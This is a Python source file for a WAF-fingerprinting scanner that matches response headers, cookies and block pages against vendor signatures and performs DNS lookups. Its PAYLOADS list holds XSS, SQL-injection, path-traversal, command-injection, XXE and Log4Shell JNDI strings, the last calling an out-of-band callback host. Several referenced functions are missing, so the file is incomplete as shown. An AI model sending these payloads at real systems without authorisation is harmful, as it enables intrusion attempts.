# -*- coding: utf-8 -*-

"""
wafchecker

feature:
async waf detection
dns lookup & reverse dns
"""

from __future__ import annotations

import asyncio
import csv
import io
import json
import random
import os
import socket
import ssl
import string
import subprocess
import sys
import threading
import time
import webbrowser
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse
from util.logger import inf, err, wrn, dbg
try:
    import aiohttp
except ImportError as e:
    err(f"Failed to import aiohttp: {e}. Please install it using 'pip install aiohttp'.")
    print("Failed to import aiohttp. Please install it using 'pip install aiohttp'.")
    sys.exit(1)
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
    from rich.live import Live
    from rich.layout import Layout
    RICH = True
    console = Console()
except ImportError as e:
    RICH = False
    console = None
    wrn(f"Optional dependency rich is unavailable; using plain-text output: {e}")
try:
    import dns.resolver
    import dns.reversename
    DNSPY = True
except ImportError as e:
    wrn(f"Optional dependency dnspython is unavailable; trying system dig for DNS records: {e}")
    DNSPY = False

WAF_DB = {
    "Cloudflare": {
        "manufacturer": "Cloudflare, Inc.",
        "headers": {"server": "cloudflare", "cf-ray": None, "cf-cache-status": None},
        "cookies": ["__cfduid", "cf_clearance"],
        "active_body": ["cloudflare", "ray id", "attention required", "cf-error"],
        "active_status": [403, 429, 503],
    },
    "AWS WAF": {
        "manufacturer": "Amazon Web Services",
        "headers": {"x-amzn-requestid": None, "x-amz-cf-id": None, "server": "awselb"},
        "cookies": ["awsalb", "awsalbcors"],
        "active_body": ["aws waf", "request blocked"],
        "active_status": [403],
    },
    "Akamai": {
        "manufacturer": "Akamai Technologies",
        "headers": {"server": "akamaighost", "x-akamai-transformed": None},
        "cookies": ["ak_bmsc", "bm_sv", "akamai"],
        "active_body": ["akamai", "reference #"],
        "active_status": [403],
    },
    "Imperva / Incapsula": {
        "manufacturer": "Imperva",
        "headers": {"x-iinfo": None, "x-cdn": "incapsula"},
        "cookies": ["incap_ses", "visid_incap"],
        "active_body": ["incapsula", "_incap_ses", "request unsuccessful"],
        "active_status": [403],
    },
    "F5 BIG-IP ASM": {
        "manufacturer": "F5 Networks",
        "headers": {"x-wa-info": None, "server": "big-ip"},
        "cookies": ["tsxxxxxxxx", "bigipserver"],
        "active_body": ["the requested url was rejected", "f5 networks"],
        "active_status": [403],
    },
    "Barracuda": {
        "manufacturer": "Barracuda Networks",
        "headers": {"server": "barracuda", "barra_counter_session": None},
        "cookies": ["barra_counter_session", "bncookie"],
        "active_body": ["barracuda", "you have been blocked"],
        "active_status": [403],
    },
    "Citrix NetScaler": {
        "manufacturer": "Citrix Systems",
        "headers": {"via": "netscaler", "server": "netscaler"},
        "cookies": ["citrix_ns_id", "nsc_"],
        "active_body": ["netscaler", "citrix"],
        "active_status": [403],
    },
    "Sucuri": {
        "manufacturer": "Sucuri Inc.",
        "headers": {"x-sucuri-id": None, "server": "sucuri"},
        "cookies": ["sucuri_cloudproxy"],
        "active_body": ["sucuri website firewall", "sucuri cloudproxy", "access denied"],
        "active_status": [403],
    },
    "ModSecurity": {
        "manufacturer": "Trustwave / OWASP CRS",
        "headers": {"server": "mod_security", "x-mod-security": None},
        "cookies": [],
        "active_body": ["mod_security", "not acceptable", "406 not acceptable"],
        "active_status": [403, 406],
    },
    "Wallarm": {
        "manufacturer": "Wallarm Inc.",
        "headers": {"server": "nginx-wallarm"},
        "cookies": [],
        "active_body": ["wallarm", "request blocked"],
        "active_status": [403],
    },
    "Fortinet FortiWeb": {
        "manufacturer": "Fortinet",
        "headers": {"server": "fortiweb", "set-cookie": "fortiweb"},
        "cookies": ["fortiweb"],
        "active_body": ["fortiweb", "blocked"],
        "active_status": [403],
    },
    "Radware AppWall": {
        "manufacturer": "Radware",
        "headers": {"server": "rdwr", "x-sl-compstate": None},
        "cookies": ["rdwr"],
        "active_body": ["radware", "unauthorized activity"],
        "active_status": [403],
    },
    "Fastly": {
        "manufacturer": "Fastly, Inc.",
        "headers": {"x-served-by": "cache", "x-fastly-request-id": None, "via": "fastly"},
        "cookies": [],
        "active_body": ["fastly"],
        "active_status": [403],
    },
    "StackPath": {
        "manufacturer": "StackPath",
        "headers": {"server": "stackpath", "x-sp-url": None},
        "cookies": [],
        "active_body": ["stackpath"],
        "active_status": [403],
    },
    "DenyAll": {
        "manufacturer": "DenyAll",
        "headers": {"server": "denyall"},
        "cookies": ["sessioncookie"],
        "active_body": ["denyall"],
        "active_status": [403],
    },
    "Comodo WAF": {
        "manufacturer": "Comodo Group",
        "headers": {"server": "cws"},
        "cookies": [],
        "active_body": ["protected by comodo", "comodo waf"],
        "active_status": [403],
    },
    "Huawei Cloud WAF": {
        "manufacturer": "Huawei Technologies",
        "headers": {"server": "hwcloudwaf"},
        "cookies": [],
        "active_body": ["huawei cloud waf", "hwcloudwaf"],
        "active_status": [403],
    },
    "Alibaba Cloud WAF": {
        "manufacturer": "Alibaba Group",
        "headers": {"server": "aliyungf", "x-server": "tengine"},
        "cookies": ["acw_tc"],
        "active_body": ["alibaba", "aliyun"],
        "active_status": [403, 405],
    },
    "Tencent Cloud WAF": {
        "manufacturer": "Tencent Cloud",
        "headers": {"server": "tencent"},
        "cookies": [],
        "active_body": ["tencent cloud waf"],
        "active_status": [403],
    },
    "360 WAF": {
        "manufacturer": "Qihoo 360",
        "headers": {"server": "360waf", "x-powered-by": "360waf"},
        "cookies": [],
        "active_body": ["360waf", "wangzhan.360"],
        "active_status": [403],
    },
    "Yundun": {
        "manufacturer": "Yundun",
        "headers": {"server": "yundun"},
        "cookies": [],
        "active_body": ["yundun"],
        "active_status": [403],
    },
    "Edgecast / Verizon": {
        "manufacturer": "Edgecast",
        "headers": {"server": "ecs", "x-ec-cache": None},
        "cookies": [],
        "active_body": ["edgecast"],
        "active_status": [403],
    },
    "BinarySec": {
        "manufacturer": "BinarySec",
        "headers": {"server": "binarysec", "x-binarysec-via": None},
        "cookies": [],
        "active_body": ["binarysec"],
        "active_status": [403],
    },
    "BlockDoS": {
        "manufacturer": "BlockDoS",
        "headers": {"server": "blockdos"},
        "cookies": [],
        "active_body": ["blockdos"],
        "active_status": [403],
    },
    "Cisco ACE": {
        "manufacturer": "Cisco Systems",
        "headers": {"server": "cisco ace"},
        "cookies": [],
        "active_body": ["cisco ace"],
        "active_status": [403],
    },
    "Amazon CloudFront": {
        "manufacturer": "Amazon Web Services",
        "headers": {"x-amz-cf-id": None, "via": "cloudfront"},
        "cookies": [],
        "active_body": ["cloudfront"],
        "active_status": [403],
    },
    "IBM DataPower": {
        "manufacturer": "IBM",
        "headers": {"x-backside-transport": None},
        "cookies": [],
        "active_body": ["datapower"],
        "active_status": [403],
    },
    "Azure Front Door": {
        "manufacturer": "Microsoft Azure",
        "headers": {"x-azure-ref": None, "x-fd-healthprobe": None},
        "cookies": [],
        "active_body": ["azure front door"],
        "active_status": [403],
    },
    "Palo Alto": {
        "manufacturer": "Palo Alto Networks",
        "headers": {"server": "paloalto"},
        "cookies": [],
        "active_body": ["palo alto", "pan-os"],
        "active_status": [403],
    },
    "Reblaze": {
        "manufacturer": "Reblaze",
        "headers": {"server": "reblaze"},
        "cookies": ["rbzsessionid"],
        "active_body": ["reblaze"],
        "active_status": [403],
    },
    "SiteGuard": {
        "manufacturer": "SiteGuard",
        "headers": {"server": "siteguard"},
        "cookies": [],
        "active_body": ["siteguard"],
        "active_status": [403],
    },
    "SonicWall": {
        "manufacturer": "SonicWall",
        "headers": {"server": "sonicwall"},
        "cookies": [],
        "active_body": ["sonicwall", "blocked by sonicwall"],
        "active_status": [403],
    },
    "Traefik": {
        "manufacturer": "Traefik Labs",
        "headers": {"server": "traefik"},
        "cookies": [],
        "active_body": ["traefik"],
        "active_status": [403],
    },
    "URLScan": {
        "manufacturer": "URLScan.io",
        "headers": {"server": "urlscan"},
        "cookies": [],
        "active_body": ["urlscan"],
        "active_status": [403],
    },
    "Varnish": {
        "manufacturer": "Varnish Software",
        "headers": {"via": "varnish", "x-varnish": None},
        "cookies": [],
        "active_body": ["varnish"],
        "active_status": [403],
    },
    "WebKnight": {
        "manufacturer": "AQTRONIX",
        "headers": {"server": "webknight"},
        "cookies": [],
        "active_body": ["webknight"],
        "active_status": [403],
    },
    "Zenedge": {
        "manufacturer": "Zenedge (Oracle)",
        "headers": {"server": "zenedge"},
        "cookies": [],
        "active_body": ["zenedge"],
        "active_status": [403],
    },
    "Google Cloud Armor": {
        "manufacturer": "Google Cloud",
        "headers": {"server": "gws", "via": "google"},
        "cookies": [],
        "active_body": ["google cloud armor"],
        "active_status": [403],
    },
}

PAYLOADS = [
    '<script>alert("XSS")</script>',
    "' OR '1'='1' --",
    "UNION SELECT ALL FROM information_schema--",
    "../../etc/passwd",
    "/bin/cat /etc/passwd; ping 127.0.0.1",
    ']>&hack;',
    "${jndi:ldap://x.oast.pro/a}",
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    "../../../../windows/win.ini",
    "%00../../etc/passwd",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.4.0",
    "Wget/1.21.3",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "okhttp/4.9.0",
]

@dataclass
class ScanResult:
    target: str
    ip: Optional[str] = None
    waf: Optional[str] = None
    manufacturer: Optional[str] = None
    confidence: float = 0.0
    method: Optional[str] = None
    status: Optional[int] = None
    response_ms: float = 0.0
    evidence: list = field(default_factory=list)
    dns: dict = field(default_factory=dict)
    ptr: Optional[str] = None
    error: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> dict:
        d = asdict(self)
        d["confidence"] = round(self.confidence, 2)
        d["response_ms"] = round(self.response_ms, 2)
        return d

    def detected(self) -> bool:
        return self.waf is not None

class ScanState:
    def __init__(self):
        self._lock = threading.Lock()
        self.results: dict[str, ScanResult] = {}
        self.targets_total = 0
        self.targets_done = 0
        self.started_at = datetime.now().isoformat()
        self.finished = False
        self.config_summary = {}

    def add_result(self, r: ScanResult):
        with self._lock:
            self.results[r.target] = r
            self.targets_done += 1

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "started_at": self.started_at,
                "finished": self.finished,
                "targets_total": self.targets_total,
                "targets_done": self.targets_done,
                "config": self.config_summary,
                "results": [r.to_dict() for r in self.results.values()],
            }


STATE = ScanState()

def dns_lookup(host: str) -> dict:
    info: dict = {"A": [], "AAAA": [], "MX": [], "NS": [], "TXT": [], "CNAME": [], "SOA": []}
    try:
        info["A"] = sorted({ai[4][0] for ai in socket.getaddrinfo(host, None, socket.AF_INET)})
    except Exception:
        pass
    try:
        info["AAAA"] = sorted({ai[4][0] for ai in socket.getaddrinfo(host, None, socket.AF_INET6)})
    except Exception:
        pass

    if DNSPY:
        for rtype in ("MX", "NS", "TXT", "CNAME", "SOA"):
            try:
                ans = dns.resolver.resolve(host, rtype, lifetime=5)
                for r in ans:
                    info[rtype].append(str(r).strip('"'))
            except Exception:
                pass
    else:
        for rtype in ("MX", "NS", "TXT", "CNAME", "SOA"):
            try:
                out = subprocess.run(
                    ["dig", "+short", host, rtype],
                    capture_output=True, text=True, timeout=5,
                ).stdout.strip()
                if out:
                    info[rtype] = [l.strip() for l in out.splitlines() if l.strip()]
            except Exception:
                pass
    return info

def reverse_dns(ip: str) -> Optional[str]:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception as e:
        return None


def normalize_url(target: str) -> str:
    target = target.strip()
    if not target:
        raise ValueError("Target must not be empty")
    if "://" not in target:
        target = f"https://{target}"

    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError(f"Invalid HTTP(S) target: {target}")
    try:
        parsed.port
    except ValueError as e:
        raise ValueError(f"Invalid target port: {target}") from e
    return target


def extract_host(url: str) -> str:
    host = urlparse(url).hostname
    if not host:
        raise ValueError(f"Target URL has no hostname: {url}")
    return host


def pick_ua(pool: list[str]) -> str:
    return random.choice(pool or USER_AGENTS)

"""
Manage asynchronous HTTP requests for WAF analysis.
Provides request concurrency control, session management, configurable, timeouts, proxy support and http response metadata collection
"""
class WAFEngine:
    def __init__(self, cfg: dict):
        """Initialize the engine with configuration and concurrency control.

        Args:
            cfg (dict): Engine configuration, including concurrency limits,
                request timeout, delay, proxy, User-Agent pool, and redirect
                behavior.
        """
        self.cfg = cfg
        self.sem = asyncio.Semaphore(cfg.get("concurrency", 20))
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        """Create and initialize the asynchronous HTTP client session.

        Configures the TCP connector, connection limit, and request timeout.

        Returns:
            WAFEngine: The initialized engine instance.
        """
        connector = aiohttp.TCPConnector(ssl=False, limit=self.cfg.get("concurrency", 20), force_close=True)
        timeout = aiohttp.ClientTimeout(total=self.cfg.get("timeout", 10))
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        return self

    async def __aexit__(self, *exc):
        """Close the HTTP client session when leaving the context manager.

        Args:
            *exc: Optional exception information supplied by the
                asynchronous context manager protocol.
        """
        if self.session:
            await self.session.close()

    async def request(self, url: str, params=None, headers=None):
        """Send an asynchronous GET request and collect the response data.

        Args:
            url (str): The target URL to request.
            params (dict, optional): Query parameters appended to the URL.
            headers (dict, optional): Additional HTTP request headers.

        Returns:
            dict: Response metadata containing the HTTP status, normalized
                response headers, cookies, a truncated response body,
                elapsed time in milliseconds, and final URL. If a supported
                timeout or client error occurs, returns an error message
                and elapsed time instead.

        Notes:
            The request is subject to the configured concurrency limit,
            delay, timeout, redirect behavior, and proxy settings.
            TLS certificate verification is disabled in the current
            implementation.
        """
        async with self.sem:
            await asyncio.sleep(self.cfg.get("delay", 0.0))
            hdrs = {"User-Agent": pick_ua(self.cfg.get("ua_pool", []))}
            if headers:
                hdrs.update(headers)
            start = time.perf_counter()
            try:
                async with self.session.get(
                    url, params=params, headers=hdrs,
                    allow_redirects=self.cfg.get("follow_redirects", True),
                    ssl=False, proxy=self.cfg.get("proxy"),
                ) as r:
                    body = await r.read()
                    return {
                        "status": r.status,
                        "headers": {k.lower(): v for k, v in r.headers.items()},
                        "cookies": {k: v.value for k, v in r.cookies.items()},
                        "body": body[:8192].decode("utf-8", errors="ignore"),
                        "elapsed_ms": (time.perf_counter() - start) * 1000,
                        "final_url": str(r.url),
                    }
            except (asyncio.TimeoutError, aiohttp.ClientError) as e:
                return {"error": str(e), "elapsed_ms": (time.perf_counter() - start) * 1000}

def match_passive(headers: dict, cookies: dict) -> Optional[dict]:
    """
    Identify potential WAFs using HTTP headers and cookies.

    Compares response headers and cookie names against known signatures
    stored in WAF_DB. This method performs passive detection without
    sending additional requests.

    Args:
        headers (dict): HTTP response headers to analyze.
        cookies (dict): HTTP response cookies to analyze.

    Returns:
        Optional[dict]: A dictionary containing the detected WAF details:
            waf (str): Name of the detected WAF.
            manufacturer (str): WAF vendor or manufacturer.
            confidence (float): Detection confidence score.
            method (str): Detection method, set to "passive".
            evidence (list[str]): Evidence supporting the detection.

            Returns None if no matching signature is found.

    Notes:
        Header names and values, as well as cookie names and values,
        are normalized to lowercase before matching.
        Header signatures match when the header exists and its expected
        value is None or is contained in the actual header value.
        Cookie signatures match when a cookie name contains or starts
        with a configured cookie signature.
        Returns the first matching signature rather than evaluating
        all possible matches.
    """
    h = {k.lower(): str(v).lower() for k, v in headers.items()}
    c = {k.lower(): str(v).lower() for k, v in cookies.items()}

    for name, sig in WAF_DB.items():
        for hk, hv in sig.get("headers", {}).items():
            if hk.lower() in h:
                if hv is None or hv.lower() in h[hk.lower()]:
                    return {
                        "waf": name,
                        "manufacturer": sig["manufacturer"],
                        "confidence": 0.95,
                        "method": "passive",
                        "evidence": [f"Header '{hk}' matches signature"],
                    }
        for ck in sig.get("cookies", []):
            ck_l = ck.lower()
            for rc in c:
                if rc.startswith(ck_l) or ck_l in rc:
                    return {
                        "waf": name,
                        "manufacturer": sig["manufacturer"],
                        "confidence": 0.9,
                        "method": "passive",
                        "evidence": [f"Cookie '{rc}' matches signature"],
                    }
    return None


def match_active(normal: dict, attacks: list) -> Optional[dict]:
    """
    Identify potential WAFs by analyzing HTTP response behavior.

    Examines responses from normal and test requests against known WAF
    signatures, looking for configured response-body keywords and HTTP
    status codes associated with blocking behavior.

    Args:
        normal (dict): Response metadata from a normal request.
            Currently unused by the detection logic.
        attacks (list): Response dictionaries collected from test requests.
            Entries containing an "error" key are skipped.

    Returns:
        Optional[dict]: A dictionary containing the detected WAF details:
            waf (str): Name of the detected WAF.
            manufacturer (str): WAF vendor or manufacturer.
            confidence (float): Heuristic confidence score.
            method (str): Detection method, set to "active".
            evidence (list[str]): Up to three recorded matching indicators.

            Returns None if no signature reaches the required hit threshold.

    Notes:
        Response bodies are checked for keywords configured in each
        signature's "active_body" list. HTTP status codes are compared
        against the signature's "active_status" list.
        A signature must accumulate at least two hits to be returned.
        The confidence score is calculated heuristically and is not
        a statistically calibrated probability.
        This function analyzes supplied responses; it does not send
        HTTP requests itself.
    """
    for name, sig in WAF_DB.items():
        hits, reasons = 0, []
        for atk in attacks:
            if "error" in atk:
                continue
            body_l = atk.get("body", "").lower()
            for kw in sig.get("active_body", []):
                if kw.lower() in body_l:
                    hits += 1
                    reasons.append(f"Body contains '{kw}' (status {atk['status']})")
                    break
            if atk["status"] in sig.get("active_status", []):
                hits += 1
                reasons.append(f"Blocked status code {atk['status']}")

        if hits >= 2:
            conf = min(0.85 + 0.05 * hits, 0.99)
            return {
                "waf": name,
                "manufacturer": sig["manufacturer"],
                "confidence": conf,
                "method": "active",
                "evidence": reasons[:3],
            }
    return None

def behavioral_analysis(normal: dict, attacks: list) -> Optional[dict]:
    """
    Detect potential WAF behavior by comparing HTTP responses.

    Analyzes differences between a normal HTTP response and responses
    collected from test requests. Detection indicators include HTTP status
    changes, blocking-related body keywords, server header variations,
    and failed test requests.

    Args:
        normal (dict): HTTP response metadata from a baseline request.
            Expected fields include "status" and optionally "headers".
        attacks (list): Response dictionaries collected from test requests.
            Entries containing an "error" key are counted as failed requests
            and excluded from the initial response comparison.

    Returns:
        Optional[dict]: A detection result containing:
            waf (str): Generic WAF detection label.
            manufacturer (str): Manufacturer identification, set to
                "Unknown / Generic".
            confidence (float): Heuristic confidence score capped at 0.85.
            method (str): Detection method, set to "behavioral".
            evidence (list[str]): Up to four recorded detection indicators.

            Returns None if the accumulated score is below 0.4.

    Notes:
        The analysis increases its score when attack responses differ
        from the baseline status, contain blocking-related keywords,
        or use a different server header. Three or more failed requests
        also increase the score.

        The confidence score is heuristic and does not represent a
        statistically calibrated probability. Response differences and
        request failures can have causes unrelated to a WAF.
    """
    evidence, conf = [], 0.0

    for atk in attacks:
        if "error" in atk:
            continue
        if atk["status"] != normal.get("status"):
            evidence.append(f"Status change {normal.get('status')} → {atk['status']}")
            conf += 0.15
        body_l = atk.get("body", "").lower()
        for kw in ("blocked", "forbidden", "access denied", "security", "not acceptable",
                   "request rejected", "firewall", "denied"):
            if kw in body_l:
                evidence.append(f"Blocking page keyword: '{kw}'")
                conf += 0.2
                break

    # Server header variation
    ns = normal.get("headers", {}).get("server", "")
    for atk in attacks:
        s = atk.get("headers", {}).get("server", "")
        if s and s != ns:
            evidence.append(f"Server header changed: '{ns}' → '{s}'")
            conf += 0.25
            break

    errors = sum(1 for a in attacks if "error" in a)
    if errors >= 3:
        evidence.append(f"{errors} attack requests failed/reset")
        conf += 0.2

    if conf >= 0.4:
        return {
            "waf": "Generic WAF (Behavioral)",
            "manufacturer": "Unknown / Generic",
            "confidence": min(conf, 0.85),
            "method": "behavioral",
            "evidence": evidence[:4],
        }
    return None

async def scan_target(engine: WAFEngine, target: str) -> ScanResult:
    try:
        url = normalize_url(target)
        host = extract_host(url)
    except ValueError as e:
        return ScanResult(target=target, error=str(e))
    r = ScanResult(target=url)

    # --- DNS / IP ---
    r.dns = dns_lookup(host)
    if r.dns.get("A"):
        r.ip = r.dns["A"][0]
        r.ptr = reverse_dns(r.ip)

    # --- Normal request ---
    normal = await engine.request(url)
    if "error" in normal:
        r.error = normal["error"]
        return r
    r.status = normal["status"]
    r.response_ms = normal["elapsed_ms"]

    # --- Passive ---
    p = match_passive(normal.get("headers", {}), normal.get("cookies", {}))
    if p:
        r.waf, r.manufacturer, r.confidence = p["waf"], p["manufacturer"], p["confidence"]
        r.method, r.evidence = p["method"], p["evidence"]
        return r

    r.evidence.append("No WAF signature detected in the baseline response.")
    return r

async def run_scans(targets: list, cfg: dict, on_result=None) -> list:
    results = []
    async with WAFEngine(cfg) as engine:
        tasks = [scan_target(engine, t) for t in targets]
        for coro in asyncio.as_completed(tasks):
            r = await coro
            results.append(r)
            if on_result:
                on_result(r)
    return results

def print_banner():
    b = BANNER.format(ver=VERSION)
    if RICH:
        console.print(Panel(b.strip(), style="bold cyan", border_style="cyan"))
    else:
        print(_c(b, C.CYN))


def print_result(r: ScanResult, verbose: int = 0):
    if r.detected():
        tag = "[bold red]⚠ WAF DETECTED[/bold red]" if RICH else "WAF DETECTED"
    else:
        tag = "[bold green]✓ CLEAN[/bold green]" if RICH else "CLEAN"

    if RICH:
        console.print(f"\n{tag} — [bold]{r.target}[/bold]")
        t = Table(show_header=False, box=None, padding=(0, 2))
        t.add_row("IP Address", r.ip or "N/A")
        if r.ptr:
            t.add_row("Reverse DNS", r.ptr)
        t.add_row("WAF", r.waf or "—")
        if r.detected():
            t.add_row("Manufacturer", r.manufacturer or "Unknown")
            t.add_row("Confidence", f"{r.confidence:.0%}")
            t.add_row("Method", r.method or "—")
        t.add_row("HTTP Status", str(r.status or "N/A"))
        t.add_row("Response Time", f"{r.response_ms:.0f} ms")
        if verbose > 0 and r.evidence:
            t.add_row("Evidence", "\n".join(f"  • {e}" for e in r.evidence))
        if verbose > 1 and r.dns:
            for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"):
                vals = r.dns.get(rtype, [])
                if vals:
                    t.add_row(f"DNS {rtype}", "\n".join(f"  • {v}" for v in vals))
        if r.error:
            t.add_row("[red]Error[/red]", r.error)
        console.print(t)
    else:
        print(f"\n{tag} — {r.target}")
        print(f"  IP:          {r.ip or 'N/A'}")
        print(f"  WAF:         {r.waf or '—'}")
        if r.detected():
            print(f"  Manufacturer:{r.manufacturer}")
            print(f"  Confidence:  {r.confidence:.0%}")
            print(f"  Method:      {r.method}")
        print(f"  Status:      {r.status}")
        print(f"  Time:        {r.response_ms:.0f} ms")
        if verbose and r.evidence:
            for e in r.evidence:
                print(f"    • {e}")

def print_summary(results: list):
    total = len(results)
    found = sum(1 for r in results if r.detected())
    errors = sum(1 for r in results if r.error)
    if RICH:
        t = Table(title="📊 Summary", title_style="bold cyan")
        t.add_column("Metric", style="cyan")
        t.add_column("Value", style="bold")
        t.add_row("Total Scanned", str(total))
        t.add_row("WAF Detected", f"[red]{found}[/red]")
        t.add_row("Clean", f"[green]{total - found - errors}[/green]")
        t.add_row("Errors", f"[yellow]{errors}[/yellow]")
        console.print(t)
    else:
        print(f"\n📊 Summary: {total} scanned, {found} WAF, {errors} errors")


def export_results(results: list, path: str, fmt: str = "json"):
    data = [r.to_dict() for r in results]
    p = Path(path)
    if fmt == "csv":
        if not data:
            return
        with p.open("w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=["target", "ip", "waf", "manufacturer",
                                              "confidence", "method", "status",
                                              "response_ms", "error"])
            w.writeheader()
            for d in data:
                w.writerow({k: d.get(k) for k in w.fieldnames})
    else:
        p.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    if RICH:
        console.print(f"[green]Saved → {path}[/green]")
    else:
        print(f"Saved → {path}")

def collect_targets(args) -> list:
    targets: list[str] = []
    for t in args.targets:
        if "," in t and not t.startswith("http"):
            targets.extend([x.strip() for x in t.split(",") if x.strip()])
        elif t.endswith(".txt") and Path(t).is_file():
            targets.extend([l.strip() for l in Path(t).read_text().splitlines() if l.strip()])
        else:
            targets.append(t)
    for fpath in args.file:
        if Path(fpath).is_file():
            targets.extend([l.strip() for l in Path(fpath).read_text().splitlines() if l.strip()])
    # dedupe preserving order
    seen, out = set(), []
    for t in targets:
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out

def main():
    args = parse_args()

    if not args.targets and not args.file:
        print_banner()
        parse_args.__wrapped__ if hasattr(parse_args, "__wrapped__") else None
        # print help
        subprocess.run([sys.argv[0], "--help"])
        return

    if not args.quiet:
        print_banner()

    targets = collect_targets(args)
    if not targets:
        print(_c("[!] Tidak ada target valid.", C.RED))
        sys.exit(1)

    # UA pool
    ua_pool = list(USER_AGENTS)
    if args.ua:
        ua_pool = [args.ua]
    if args.ua_pool and Path(args.ua_pool).is_file():
        ua_pool = [l.strip() for l in Path(args.ua_pool).read_text().splitlines() if l.strip()]

    cfg = {
        "timeout": args.timeout,
        "concurrency": args.concurrency,
        "delay": args.delay,
        "proxy": args.proxy,
        "follow_redirects": not args.no_redirect,
        "ua_pool": ua_pool,
    }
    STATE.targets_total = len(targets)
    STATE.config_summary = {
        "concurrency": args.concurrency,
        "timeout": args.timeout,
        "delay": args.delay,
        "proxy": args.proxy or "none",
        "user_agents": f"{len(ua_pool)} in pool",
    }
    if args.dashboard:
        def worker():
            async def go():
                await run_scans(targets, cfg, on_result=lambda r: STATE.add_result(r))
            asyncio.run(go())
            STATE.finished = True

        threading.Thread(target=worker, daemon=True).start()
        run_dashboard(port=args.port, open_browser=not args.no_browser)
        return

    verbose_level = max(args.verbose, 2 if args.all else 0)
    show_dig = args.dig or args.all

    # print target list
    if not args.quiet and RICH:
        console.print(f"[cyan]→ Scanning {len(targets)} target(s) with concurrency={args.concurrency}[/cyan]\n")

    def on_result(r: ScanResult):
        STATE.add_result(r)
        if not args.quiet:
            print_result(r, verbose=verbose_level + (1 if show_dig else 0))

    results = asyncio.run(run_scans(targets, cfg, on_result=on_result))
    STATE.finished = True

    # summary
    if not args.quiet:
        print_summary(results)

    if args.output:
        export_results(results, args.output, fmt=args.format)

def scanning_waf(target: str) -> ScanResult:
    """Run one passive WAF check, matching the synchronous module interface."""
    cfg = {
        "timeout": 10,
        "concurrency": 1,
        "delay": 0,
        "proxy": None,
        "follow_redirects": True,
        "ua_pool": USER_AGENTS,
    }
    result = asyncio.run(run_scans([target], cfg))[0]
    print_result(result)
    return result
